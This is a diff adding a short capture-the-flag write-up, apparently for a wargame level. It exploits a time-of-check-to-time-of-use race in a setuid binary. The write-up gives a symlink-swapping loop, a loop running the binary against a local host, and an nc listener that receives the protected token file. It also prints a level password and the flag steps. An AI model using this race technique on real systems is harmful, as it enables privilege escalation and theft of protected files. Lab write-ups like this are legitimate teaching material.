@@ -1,0 +1,10 @@
+we have a binary and a token - binary sends a file given as an argument to a host if it has access to it
+binary uses access (nm -u /gdb), the port is 6969 (gdb), the host is 10.0.2.15 (hostname -I)
+"The result of access() should not be used to make an actual access control decision, since its response, even if correct at the moment it is formed, may be outdated at the time you act on it"
+we will access level10 but open token switching them back and forth:
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done - first shell
+while true; do ./level10 /tmp/exploit 10.0.2.15; done - second shell
+nc -lk 6969 - third shell and watch
+su flag08
+woupa2yuojeeaaed06riuj63c
+getflag
